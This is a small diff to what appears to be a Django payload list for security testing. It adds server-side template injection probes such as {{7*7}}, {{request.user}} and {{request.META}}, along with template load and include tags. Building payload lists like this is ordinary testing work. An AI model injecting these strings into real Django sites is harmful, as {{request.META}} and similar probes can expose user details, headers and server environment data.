@@ -1,2 +1,8 @@
--e # django Payload 14
+-e # Django Payloads
 # Version: 1.0.15-20260301-Minggu-1621-WIB
+
+{{7*7}}
+{{request.user}}
+{{request.META}}
+{% load static %}
+{% include "footer.html" %}
